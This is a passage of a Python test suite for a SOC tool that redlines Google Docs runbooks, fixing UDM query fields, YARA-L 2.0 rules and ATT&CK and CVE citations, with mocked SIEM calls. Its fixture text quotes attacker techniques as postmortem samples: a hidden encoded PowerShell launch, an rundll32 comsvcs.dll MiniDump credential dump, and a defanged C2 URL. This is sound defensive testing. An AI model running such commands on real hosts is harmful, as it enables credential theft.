                                "startIndex": 1,
                                "endIndex": 1 + len(p1),
                                "textRun": {"content": p1},
                            }
                        ]
                    }
                }
            ]
        },
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc)
        body = json.loads(request.content.decode("utf-8"))
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-dedup-{i}"}}
                        for i in range(len(body.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200, json={"replies": [{} for _ in body.get("requests", [])]}
        )

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    # Caller explicitly supplies a semantic comment/edit for 'process.command_line',
    # while leaving 'file.sha256' to be caught automatically by Stage A UDM detection.
    res = review_google_doc_with_stage_a(
        "doc-dedup-udm",
        semantic_comments=[
            {
                "quote": "process.command_line",
                "comment": "Custom caller comment for process.command_line.",
            }
        ],
        semantic_edits=[
            {
                "quote": "process.command_line",
                "replacement": "target.process.command_line",
            }
        ],
        token_source=token_source,
        transport=transport,
    )

    assert res["status"] == "success"
    assert res["stage_a_udm_count"] == 2
    # 1 deduplicated Stage A UDM edit (file.sha256) + 1 Stage B semantic edit (process.command_line) = 2
    assert res["comments"]["inserted_count"] == 2
    assert res["edits"]["applied_count"] == 2


# ---------------------------------------------------------------------------
# Cycle 2 (H3): Bidirectional Google Docs Suggestion Inspector, Multi-Pass
# Idempotency & Markdown Runbook Sync
# ---------------------------------------------------------------------------


def _make_inline_suggestions_doc_payload() -> dict[str, Any]:
    """Builds a realistic Google Docs API v1 ``SUGGESTIONS_INLINE`` payload.

    Mirrors the exact wire structure returned by Docs API v1 after
    ``writeMode="SUGGEST"`` edits:
    - Paragraph 1 has a replacement (`suggest.rep1`: `ip` -> `principal.ip`).
    - Paragraph 2 is untouched after the shift (`resource.name = "projects/base-production"\n`).
    """
    pre = 'Query: `metadata.log_type = "GCP_CLOUDAUDIT" AND '  # len 49 -> 1..50
    ins = "principal.ip"  # len 12 -> 50..62
    dele = "ip"  # len 2 -> 62..64
    post = ' = "104.198.226.161"`\n'  # len 22 -> 64..86
    p2 = 'Next: `resource.name = "projects/base-production"`\n'  # len 51 -> 86..137
    return {
        "documentId": "doc-inline-sugg",
        "title": "Inline Suggestion Projection Test",
        "tabs": [
            {
                "documentTab": {
                    "body": {
                        "content": [
                            {
                                "paragraph": {
                                    "elements": [
                                        {
                                            "startIndex": 1,
                                            "endIndex": 50,
                                            "textRun": {"content": pre},
                                        },
                                        {
                                            "startIndex": 50,
                                            "endIndex": 62,
                                            "textRun": {
                                                "content": ins,
                                                "suggestedInsertionIds": ["suggest.rep1"],
                                            },
                                        },
                                        {
                                            "startIndex": 62,
                                            "endIndex": 64,
                                            "textRun": {
                                                "content": dele,
                                                "suggestedDeletionIds": ["suggest.rep1"],
                                            },
                                        },
                                        {
                                            "startIndex": 64,
                                            "endIndex": 86,
                                            "textRun": {"content": post},
                                        },
                                    ]
                                }
                            },
                            {
                                "paragraph": {
                                    "elements": [
                                        {
                                            "startIndex": 86,
                                            "endIndex": 137,
                                            "textRun": {"content": p2},
                                        }
                                    ]
                                }
                            },
                        ]
                    }
                }
            }
        ],
    }


def test_extract_text_and_index_map_handles_inline_suggestions_without_text_fusion():
    from manager.tools.docs_review_tools import (
        _extract_text_and_index_map,
        _find_quote_indices,
        extract_doc_projections,
    )

    doc = _make_inline_suggestions_doc_payload()

    baseline_text, baseline_map = _extract_text_and_index_map(doc, view_mode="baseline")
    accepted_text, accepted_map = _extract_text_and_index_map(doc, view_mode="accepted")
    inline_text, _ = _extract_text_and_index_map(doc, view_mode="inline")

    # Baseline excludes suggestedInsertionIds so 'principal.ip' and 'ip' never fuse
    assert "principal.ipip" not in baseline_text
    assert "ipprincipal.ip" not in baseline_text
    assert 'AND ip = "104.198.226.161"' in baseline_text
    assert "principal.ip" not in baseline_text

    # Accepted excludes suggestedDeletionIds and includes suggestedInsertionIds
    assert 'AND principal.ip = "104.198.226.161"' in accepted_text
    assert "principal.ipip" not in accepted_text
    assert len(accepted_text) == len(accepted_map)

    # Inline preserves the raw concatenation
    assert "principal.ipip" in inline_text

    # Subsequent untouched paragraph still maps to its exact post-suggestion UTF-16 indices (93..106)
    res_span = _find_quote_indices(baseline_text, baseline_map, "resource.name")
    assert res_span == (93, 106)

    projections = extract_doc_projections(doc)
    assert len(projections["suggestions"]) == 1
    s0 = projections["suggestions"][0]
    assert s0["suggestion_id"] == "suggest.rep1"
    assert s0["kind"] == "replace"
    assert s0["deleted_text"] == "ip"
    assert s0["inserted_text"] == "principal.ip"
    assert s0["start_index"] == 50
    assert s0["end_index"] == 64
    assert projections["pending_suggestion_spans"] == [(50, 64)]


def test_inspect_doc_suggestions_returns_structured_pairs_and_unified_diff():
    from manager.tools.docs_review_tools import inspect_doc_suggestions

    doc = {
        "documentId": "doc-inspect-1",
        "title": "Runbook Redline Diff Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 15,
                                "textRun": {"content": "Containment: `"},
                            },
                            {
                                "startIndex": 15,
                                "endIndex": 50,
                                "textRun": {
                                    "content": "gcloud iam service-accounts disable",
                                    "suggestedInsertionIds": ["suggest.sa_fix"],
                                },
                            },
                            {
                                "startIndex": 50,
                                "endIndex": 84,
                                "textRun": {
                                    "content": "gcloud iam service-accounts delete",
                                    "suggestedDeletionIds": ["suggest.sa_fix"],
                                },
                            },
                            {
                                "startIndex": 84,
                                "endIndex": 86,
                                "textRun": {"content": "`\n"},
                            },
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 86,
                                "endIndex": 108,
                                "textRun": {
                                    "content": "Note: verify scope.\n",
                                    "suggestedInsertionIds": ["suggest.pure_ins"],
                                },
                            }
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 108,
                                "endIndex": 126,
                                "textRun": {
                                    "content": "Deprecated step.\n",
                                    "suggestedDeletionIds": ["suggest.pure_del"],
                                },
                            }
                        ]
                    }
                },
            ]
        },
    }

    transport = httpx.MockTransport(lambda req: httpx.Response(200, json=doc))
    token_source = StaticTokenSource("adc-token")

    res_all = inspect_doc_suggestions(
        "doc-inspect-1",
        token_source=token_source,
        transport=transport,
    )
    assert res_all["status"] == "success"
    assert res_all["suggestion_count"] == 3
    assert res_all["accepted_suggestion_count"] == 3
    by_id = {s["suggestion_id"]: s for s in res_all["suggestions"]}
    assert by_id["suggest.sa_fix"]["kind"] == "replace"
    assert by_id["suggest.pure_ins"]["kind"] == "insert"
    assert by_id["suggest.pure_del"]["kind"] == "delete"
    assert "-Containment: `gcloud iam service-accounts delete`" in res_all["unified_diff"]
    assert "+Containment: `gcloud iam service-accounts disable`" in res_all["unified_diff"]
    assert "Deprecated step." not in res_all["accepted_text"]
    assert "Note: verify scope." in res_all["accepted_text"]

    # Selective acceptance: accept only suggest.sa_fix, reject pure_ins and pure_del
    res_partial = inspect_doc_suggestions(
        "doc-inspect-1",
        accept_suggestion_ids=["suggest.sa_fix"],
        token_source=token_source,
        transport=transport,
    )
    assert res_partial["accepted_suggestion_count"] == 1
    assert "gcloud iam service-accounts disable" in res_partial["accepted_text"]
    assert "Note: verify scope." not in res_partial["accepted_text"]
    assert "Deprecated step." in res_partial["accepted_text"]


def test_multi_pass_review_skips_spans_with_existing_pending_suggestions():
    from manager.tools.docs_review_tools import (
        review_google_doc_with_stage_a,
        verify_and_redline_udm_queries_in_doc,
    )

    # Doc has 1 already-suggested UDM fix ('ip' -> 'principal.ip' at 50..64)
    # and 1 untouched UDM defect ('resource.name' at 93..106)
    doc = _make_inline_suggestions_doc_payload()
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc)
        body = json.loads(request.content.decode("utf-8"))
        batch_calls.append(body)
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-mp-{i}"}}
                        for i in range(len(body.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200, json={"replies": [{} for _ in body.get("requests", [])]}
        )

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    # Pass 1 on partially-redlined doc: skips 'ip' (already has suggest.rep1) and only redlines 'resource.name'
    res = verify_and_redline_udm_queries_in_doc(
        "doc-inline-sugg",
        run_live_siem_check=False,
        token_source=token_source,
        transport=transport,
    )
    assert res["status"] == "success"
    assert res["skipped_existing_suggestion_count"] == 1
    assert res["udm_findings_count"] == 1
    assert res["findings"][0]["invalid_field"] == "resource.name"
    assert res["edits"]["applied_count"] == 1

    # Now test a fully red-lined doc where all defects already have pending suggestions:
    fully_redlined_doc = {
        "documentId": "doc-fully-redlined",
        "title": "Fully Redlined Doc",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 50,
                                "textRun": {
                                    "content": 'Query: `metadata.log_type = "GCP_CLOUDAUDIT" AND '
                                },
                            },
                            {
                                "startIndex": 50,
                                "endIndex": 62,
                                "textRun": {
                                    "content": "principal.ip",
                                    "suggestedInsertionIds": ["suggest.rep1"],
                                },
                            },
                            {
                                "startIndex": 62,
                                "endIndex": 64,
                                "textRun": {
                                    "content": "ip",
                                    "suggestedDeletionIds": ["suggest.rep1"],
                                },
                            },
                            {
                                "startIndex": 64,
                                "endIndex": 86,
                                "textRun": {"content": ' = "104.198.226.161"`\n'},
                            },
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    transport_full = httpx.MockTransport(
        lambda req: httpx.Response(200, json=fully_redlined_doc)
    )

    res_idempotent = verify_and_redline_udm_queries_in_doc(
        "doc-fully-redlined",
        run_live_siem_check=False,
        token_source=token_source,
        transport=transport_full,
    )
    assert res_idempotent["status"] == "success"
    assert res_idempotent["skipped_existing_suggestion_count"] == 1
    assert res_idempotent["udm_findings_count"] == 0
    assert res_idempotent["comments"]["inserted_count"] == 0
    assert res_idempotent["edits"]["applied_count"] == 0

    res_stage_a_idempotent = review_google_doc_with_stage_a(
        "doc-fully-redlined",
        semantic_comments=[{"quote": "ip", "comment": "Duplicate comment"}],
        semantic_edits=[{"quote": "ip", "replacement": "principal.ip"}],
        token_source=token_source,
        transport=transport_full,
    )
    assert res_stage_a_idempotent["status"] == "success"
    assert res_stage_a_idempotent["skipped_existing_suggestion_count"] == 1
    assert res_stage_a_idempotent["comments"]["inserted_count"] == 0
    assert res_stage_a_idempotent["edits"]["applied_count"] == 0


def test_export_accepted_doc_to_markdown_restores_frontmatter_and_applies_edits(
    tmp_path,
    fake_drive: FakeDriveMcpServer,
):
    from manager.tools.docs_review_tools import export_accepted_doc_to_markdown
    from skills.drive_registry import parse_frontmatter
    from skills.registry import SkillRegistry

    reports_folder = fake_drive.store.add_folder("SOC Reports")
    drive_client = DriveMcpClient(
        url=fake_drive.url,
        token_source=StaticTokenSource("drive-tok"),
        quota_project="dandye-0324-chronicle",
    )

    source_skill_md = (
        "---\n"
        "name: compromised-user-account-response\n"
        "description: Use when executing containment for compromised user credentials.\n"
        "category: irps\n"
        "version: 1.0.0\n"
        "---\n\n"
        "# Compromised User Account IRP\n"
    )

    # Simulate a converted Google Doc where YAML frontmatter '---' was collapsed into a single line
    # and 3 Suggested Edits are pending:
    collapsed_fm = (
        "name: compromised-user-account-response description: Use when executing "
        "containment for compromised user credentials. category: irps version: 1.0.0\n"
    )
    doc = {
        "documentId": "doc-export-rb",
        "title": "Runbook_Redline_compromised-user-account-response_Case_33278",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {"startIndex": 1, "endIndex": 2, "textRun": {"content": "\n"}}
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 2,
                                "endIndex": 2 + len(collapsed_fm),
                                "textRun": {"content": collapsed_fm},
                            }
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 200,
                                "endIndex": 235,
                                "textRun": {
                                    "content": "# Compromised User Account IRP\n\nRun "
                                },
                            },
                            {
                                "startIndex": 235,
                                "endIndex": 270,
                                "textRun": {
                                    "content": "gcloud iam service-accounts disable",
                                    "suggestedInsertionIds": ["suggest.1"],
                                },
                            },
                            {
                                "startIndex": 270,
                                "endIndex": 304,
                                "textRun": {
                                    "content": "gcloud iam service-accounts delete",
                                    "suggestedDeletionIds": ["suggest.1"],
                                },
                            },
                            {
                                "startIndex": 304,
                                "endIndex": 318,
                                "textRun": {"content": " and query `"},
                            },
                            {
                                "startIndex": 318,
                                "endIndex": 338,
                                "textRun": {
                                    "content": "target.resource.name",
                                    "suggestedInsertionIds": ["suggest.2"],
                                },
                            },
                            {
                                "startIndex": 338,
                                "endIndex": 351,
                                "textRun": {
                                    "content": "resource.name",
                                    "suggestedDeletionIds": ["suggest.2"],
                                },
                            },
                            {
                                "startIndex": 351,
                                "endIndex": 370,
                                "textRun": {"content": '` for beacon URL '},
                            },
                            {
                                "startIndex": 370,
                                "endIndex": 413,
                                "textRun": {
                                    "content": "hxxps://c2[.]badactor-example[.]com/beacon",
                                    "suggestedInsertionIds": ["suggest.3"],
                                },
                            },
                            {
                                "startIndex": 413,
                                "endIndex": 452,
                                "textRun": {
                                    "content": "https://c2.badactor-example.com/beacon",
                                    "suggestedDeletionIds": ["suggest.3"],
                                },
                            },
                            {
                                "startIndex": 452,
                                "endIndex": 454,
                                "textRun": {"content": ".\n"},
                            },
                        ]
                    }
                },
            ]
        },
    }

    transport = httpx.MockTransport(lambda req: httpx.Response(200, json=doc))
    token_source = StaticTokenSource("adc-token")
    out_file = tmp_path / "exported_runbook" / "SKILL.md"

    with patch.dict(os.environ, {"DRIVE_REPORTS_FOLDER_ID": reports_folder}, clear=False):
        res = export_accepted_doc_to_markdown(
            "doc-export-rb",
            skill_name="compromised-user-account-response",
            output_path=str(out_file),
            publish_to_drive=True,
            skill_content_override=source_skill_md,
            client=drive_client,
            token_source=token_source,
            transport=transport,
        )

    assert res["status"] == "success"
    assert res["suggestion_count"] == 3
    assert res["accepted_suggestion_count"] == 3
    assert res["frontmatter_restored"] is True
    assert res["frontmatter_valid"] is True
    assert res["frontmatter"]["name"] == "compromised-user-account-response"

    exported_md = res["accepted_markdown"]
    assert exported_md.startswith("---\nname: compromised-user-account-response\n")
    assert "gcloud iam service-accounts disable" in exported_md
    assert "gcloud iam service-accounts delete" not in exported_md
    assert "target.resource.name" in exported_md
    assert "hxxps://c2[.]badactor-example[.]com/beacon" in exported_md
    assert "https://c2.badactor-example.com/beacon" not in exported_md

    # Verify written file on disk parses cleanly through SkillRegistry
    assert out_file.exists()
    parsed_fm = parse_frontmatter(out_file.read_text(encoding="utf-8"))
    assert parsed_fm["name"] == "compromised-user-account-response"
    temp_reg = SkillRegistry(skills_dir=tmp_path)
    meta = temp_reg.get_skill("compromised-user-account-response")
    assert meta is not None
    assert meta.category == "irps"
    assert res["drive"] is not None
    assert res["drive"]["parentId"] == reports_folder


def _make_single_paragraph_doc(
    document_id: str, title: str, body_text: str
) -> dict[str, Any]:
    return {
        "documentId": document_id,
        "title": title,
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 1 + len(body_text),
                                "textRun": {"content": body_text},
                            }
                        ]
                    }
                }
            ]
        },
    }


def test_find_yaral2_rule_spans_detects_prefixed_udm_fields_strings_section_and_condition_var_mismatch():
    """Verifies exact 1-based UTF-16 span extraction across a YARA-L 2.0 rule
    containing ``strings:`` (instead of ``events:``), ``$e.resource.name``,
    ``$e.ip``, ``re.regex($e.process.command_line, ...)``, and undeclared
    ``$event`` in ``condition:``, confirming non-overlapping spans and clean
    ``repaired_rule_text``."""
    from manager.tools.docs_review_tools import (
        DEFAULT_UDM_FIELD_LIST_URL,
        DEFAULT_YARAL2_DOC_URL,
        find_yaral2_rule_spans,
    )

    body = (
        "Detection Engineering Follow-Up:\n"
        "rule gcp_sa_and_lolbin_test {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        "  strings:\n"
        '    $e.metadata.event_type = "GCP_CLOUDAUDIT"\n'
        '    $e.resource.name = "projects/base-production"\n'
        '    $e.ip = "104.198.226.161"\n'
        "    re.regex($e.process.command_line, /.*cmd.*/ nocase)\n"
        "  condition:\n"
        "    $event\n"
        "}\n"
    )
    doc = _make_single_paragraph_doc("doc-yaral2-spans", "YARA-L 2.0 Postmortem", body)
    plain_text, index_map = _extract_text_and_index_map(doc)

    comments, edits, findings = find_yaral2_rule_spans(plain_text, index_map)

    assert len(findings) == 5
    assert len(comments) == 5
    assert len(edits) == 5

    defect_types = [f["defect_type"] for f in findings]
    assert defect_types == [
        "yara_strings_section",
        "invalid_udm_field",
        "invalid_udm_field",
        "invalid_udm_field",
        "condition_variable_mismatch",
    ]

    # Verify standard YARA vs YARA-L 2.0 distinction in rationale and exact UTF-16 slice
    f_strings = findings[0]
    assert f_strings["quote"] == "strings:"
    assert f_strings["replacement"] == "events:"
    assert "standard YARA" in comments[0]["comment"]
    assert "YARA-L 2.0" in comments[0]["comment"]
    assert DEFAULT_YARAL2_DOC_URL in comments[0]["comment"]

    # Verify event-prefixed UDM field spans
    f_res = findings[1]
    assert f_res["invalid_field"] == "resource.name"
    assert f_res["canonical_field"] == "target.resource.name"
    assert f_res["quote"] == "$e.resource.name"
    assert f_res["replacement"] == "$e.target.resource.name"
    assert DEFAULT_UDM_FIELD_LIST_URL in comments[1]["comment"]

    f_ip = findings[2]
    assert f_ip["invalid_field"] == "ip"
    assert f_ip["canonical_field"] == "principal.ip"
    assert f_ip["quote"] == "$e.ip"
    assert f_ip["replacement"] == "$e.principal.ip"

    f_cmd = findings[3]
    assert f_cmd["invalid_field"] == "process.command_line"
    assert f_cmd["canonical_field"] == "target.process.command_line"
    assert f_cmd["quote"] == "$e.process.command_line"
    assert f_cmd["replacement"] == "$e.target.process.command_line"

    # Verify condition variable mismatch span
    f_cond = findings[4]
    assert f_cond["quote"] == "$event"
    assert f_cond["replacement"] == "$e"

    # Verify all spans are strictly non-overlapping and align with index_map
    spans = sorted((e["start_index"], e["end_index"]) for e in edits)
    for i in range(len(spans) - 1):
        assert spans[i][1] <= spans[i + 1][0]

    repaired_rule = findings[0]["repaired_rule_text"]
    assert "events:" in repaired_rule
    assert "strings:" not in repaired_rule
    assert '$e.target.resource.name = "projects/base-production"' in repaired_rule
    assert '$e.principal.ip = "104.198.226.161"' in repaired_rule
    assert "re.regex($e.target.process.command_line, `.*cmd.*`) nocase" in repaired_rule
    assert "condition:\n    $e" in repaired_rule

    # Also verify single-line collapsed YARA-L 2.0 rule blocks (as converted by Google Drive Markdown import)
    collapsed_body = " ".join(line.strip() for line in body.splitlines() if line.strip()) + "\n"
    collapsed_doc = _make_single_paragraph_doc(
        "doc-yaral2-collapsed", "Collapsed YARA-L 2.0", collapsed_body
    )
    c_plain, c_map = _extract_text_and_index_map(collapsed_doc)
    c_comments, c_edits, c_findings = find_yaral2_rule_spans(c_plain, c_map)
    assert len(c_findings) == 5
    assert len(c_comments) == 5
    assert len(c_edits) == 5
    assert 'target.resource.name = "projects/base-production"' in c_findings[0]["retrohunt_udm_query"]
    assert 'principal.ip = "104.198.226.161"' in c_findings[0]["retrohunt_udm_query"]
    assert "target.process.command_line = /.*cmd.*/ nocase" in c_findings[0]["retrohunt_udm_query"]


def test_verify_yaral2_rule_with_siem_compiles_via_validate_rule_and_runs_retrohunt():
    """Verifies ``verify_yaral2_rule_with_siem`` repairs the YARA-L 2.0 rule,
    invokes injected ``siem_validate_fn`` (``validate_rule``), extracts the
    ``events:`` predicates into a UDM query, and invokes ``siem_search_fn``
    (``search_udm``) to return ``compiler_verified=True`` and
    ``retrohunt_event_count``."""
    from manager.tools.docs_review_tools import verify_yaral2_rule_with_siem

    raw_rule = (
        "rule wins_d19_lolbin_execution {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        "  events:\n"
        '    $proc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $proc.hostname = "wins-d19"\n'
        "    re.regex($proc.process.command_line, /.*cmd.*/ nocase)\n"
        "  condition:\n"
        "    $e\n"
        "}"
    )

    validate_calls: list[str] = []
    search_calls: list[dict] = []

    def fake_validate(rule_text: str) -> str:
        validate_calls.append(rule_text)
        # Simulate secops-mcp_validate_rule output (including leading non-ASCII symbol to verify stripping)
        return "\u2705 Rule validation PASSED - syntax is valid"

    def fake_search(query: str, start_time: str, end_time: str, max_events: int):
        search_calls.append({"query": query, "max_events": max_events})
        return {"events": [{"id": f"ev-{i}"} for i in range(12)], "total_events": 12}

    result = verify_yaral2_rule_with_siem(
        raw_rule,
        run_retrohunt_check=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )

    assert result["status"] == "success"
    assert result["rule_name"] == "wins_d19_lolbin_execution"
    assert len(result["findings"]) == 3
    assert result["compiler_verified"] is True
    # Confirm non-ASCII symbols are stripped from compiler output
    assert all(ord(c) < 128 for c in result["compiler_output"])
    assert "Rule validation PASSED" in result["compiler_output"]
    assert len(validate_calls) == 1
    assert '$proc.principal.hostname = "wins-d19"' in validate_calls[0]
    assert "re.regex($proc.target.process.command_line, `.*cmd.*`) nocase" in validate_calls[0]
    assert "condition:\n    $proc" in validate_calls[0]

    assert result["retrohunt_verified"] is True
    assert result["retrohunt_event_count"] == 12
    assert len(search_calls) == 1
    assert 'metadata.event_type = "PROCESS_LAUNCH"' in search_calls[0]["query"]
    assert 'principal.hostname = "wins-d19"' in search_calls[0]["query"]
    assert "target.process.command_line = /.*cmd.*/ nocase" in search_calls[0]["query"]


def test_verify_and_redline_yaral2_rules_in_doc_anchors_comments_and_suggest_edits_with_idempotency():
    """Verifies ``verify_and_redline_yaral2_rules_in_doc`` executes
    ``insertComment`` before descending-index ``writeMode="SUGGEST"`` edits,
    enriches comments with compiler + retrohunt badges, and skips spans
    overlapping existing ``suggest.*`` ranges on a second pass."""
    from manager.tools.docs_review_tools import verify_and_redline_yaral2_rules_in_doc

    doc_text = (
        "Detection Engineering Follow-Up:\n"
        "rule gcp_sa_privilege_escalation {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        "  strings:\n"
        '    $e.metadata.event_type = "GCP_CLOUDAUDIT"\n'
        '    $e.resource.name = "projects/base-production"\n'
        '    $e.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $event\n"
        "}\n"
    )
    mock_doc = _make_single_paragraph_doc("doc-yaral2-live", "Postmortem YARA-L 2.0", doc_text)
    batch_calls: list[dict] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        return httpx.Response(
            200,
            json={
                "documentId": "doc-yaral2-live",
                "replies": [{} for _ in payload.get("requests", [])],
            },
        )

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED - syntax is valid"

    def fake_search(query: str, start_time: str, end_time: str, max_events: int):
        # Simulate Case 33278 where target.resource.name returns 0 hits and relaxed query returns 9 hits
        if "target.resource.name" in query:
            return {"events": [], "total_events": 0}
        return {"events": [{"id": f"ev-{i}"} for i in range(9)], "total_events": 9}

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-yaral2-live",
        run_live_siem_check=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=token_source,
        transport=transport,
    )

    assert res["status"] == "success"
    assert res["yaral2_findings_count"] == 4
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 4
    assert res["edits"]["applied_count"] == 4
    assert len(res["siem_rule_checks"]) == 1
    rv = res["siem_rule_checks"][0]
    assert rv["compiler_verified"] is True
    assert rv["retrohunt_event_count"] == 9

    # Ordering invariant: batch_calls[0] is comments (no writeControl), batch_calls[1] is SUGGEST edits
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}

    for req in batch_calls[0]["requests"]:
        body_str = req["insertComment"]["content"]
        assert "Chronicle YARA-L 2.0 Compiler Verified: PASSED" in body_str
        assert "events_matched=9" in body_str

    # Verify descending index ordering on SUGGEST deleteContentRange requests
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Second pass: simulate existing pending suggestion spanning the entire rule block
    mock_doc_with_suggestions = {
        "documentId": "doc-yaral2-live",
        "title": "Postmortem YARA-L 2.0",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.existing.yaral2"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    transport2 = httpx.MockTransport(
        lambda req: httpx.Response(200, json=mock_doc_with_suggestions)
    )
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-yaral2-live",
        run_live_siem_check=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=token_source,
        transport=transport2,
    )
    assert res2["yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 4
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


def test_review_google_doc_with_stage_a_includes_and_deduplicates_yaral2_spans():
    """Verifies ``review_google_doc_with_stage_a`` automatically includes Stage A
    YARA-L 2.0 findings and deduplicates them against Stage B semantic edits."""
    from manager.tools.docs_review_tools import (
        find_yaral2_rule_spans,
        review_google_doc_with_stage_a,
    )

    doc_text = (
        "Rule:\n"
        "rule sample_rule {\n"
        "  events:\n"
        '    $e.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    mock_doc = _make_single_paragraph_doc("doc-stage-a-yaral2", "Stage A YARA-L 2.0", doc_text)
    plain, idx_map = _extract_text_and_index_map(mock_doc)
    _, yara_edits, _ = find_yaral2_rule_spans(plain, idx_map)
    assert len(yara_edits) == 1
    ip_span = yara_edits[0]

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        return httpx.Response(
            200,
            json={
                "documentId": "doc-stage-a-yaral2",
                "replies": [{} for _ in payload.get("requests", [])],
            },
        )

    # Pass an overlapping Stage B edit on the exact same $e.ip span to verify deduplication
    res = review_google_doc_with_stage_a(
        "doc-stage-a-yaral2",
        semantic_edits=[
            {
                "start_index": ip_span["start_index"],
                "end_index": ip_span["end_index"],
                "replacement": "$e.principal.ip",
            }
        ],
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )

    assert res["status"] == "success"
    assert res["stage_a_yaral2_count"] == 1
    assert res["edits"]["applied_count"] == 1


# ---------------------------------------------------------------------------
# Cycle 4 (H4): Deterministic + Grounded MITRE ATT&CK & CVE/KEV Span Verifier
# ---------------------------------------------------------------------------


def test_find_mitre_and_cve_spans_detects_deprecated_ids_subtechnique_mismatches_and_cve_swaps():
    """Verifies exact 1-based UTF-16 span computation across deprecated ATT&CK IDs
    (``T1086``, ``T1085``), sibling sub-technique mismatches (``T1059.003`` ->
    ``T1059.001``, ``T1003.002`` -> ``T1003.001``, ``T1078.001`` -> ``T1078.004``,
    ``T1098.001`` -> ``T1098.003``, ``T1218.010`` -> ``T1218.011``), valid technique
    preservation (zero false positives on valid ``T1059.001`` or ``CVE-2024-21762``
    citations), and cross-vendor CISA KEV CVE swaps (``CVE-2024-21887`` on FortiOS
    -> ``CVE-2024-21762``)."""
    from manager.tools.docs_review_tools import (
        CISA_KEV_CATALOG_URL,
        _extract_text_and_index_map,
        find_mitre_and_cve_spans,
        mitre_technique_url,
        nvd_cve_url,
    )

    assert (
        mitre_technique_url("T1059.001")
        == "https://attack.mitre.org/techniques/T1059/001/"
    )
    assert (
        mitre_technique_url("T1059")
        == "https://attack.mitre.org/techniques/T1059/"
    )
    assert (
        nvd_cve_url("CVE-2024-21762")
        == "https://nvd.nist.gov/vuln/detail/CVE-2024-21762"
    )

    body = (
        "# Incident Postmortem & YARA-L 2.0 Meta Taxonomy Review\n"
        "1. Valid PowerShell citation: T1059.001 (Command and Scripting Interpreter: PowerShell) "
        "https://attack.mitre.org/techniques/T1059/001/\n"
        "2. Valid Fortinet KEV citation: CVE-2024-21762 on Fortinet FortiOS SSL VPN "
        "https://nvd.nist.gov/vuln/detail/CVE-2024-21762\n"
        "3. Deprecated PowerShell ID in Case 33269: T1086 (PowerShell Empire stager)\n"
        "4. Deprecated Rundll32 ID in Case 33288: T1085 (Rundll32 execution)\n"
        "5. Sibling PowerShell mismatch: T1059.003 observed with powershell.exe -NoP -W Hidden -Enc payload\n"
        "6. Sibling LSASS dump mismatch: T1003.002 observed with rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump\n"
        "7. Cloud account mismatch in Case 33278: T1078.001 used by GCP IAM service account base-service-account@base-production.iam.gserviceaccount.com\n"
        "8. Cloud IAM role binding mismatch: T1098.001 observed during SetIamPolicy granting roles/editor\n"
        "9. System binary proxy mismatch: T1218.010 observed for rundll32.exe proxy execution\n"
        "10. Cross-vendor CISA KEV swap: CVE-2024-21887 exploited on Fortinet FortiOS SSL VPN out-of-bounds write\n"
    )
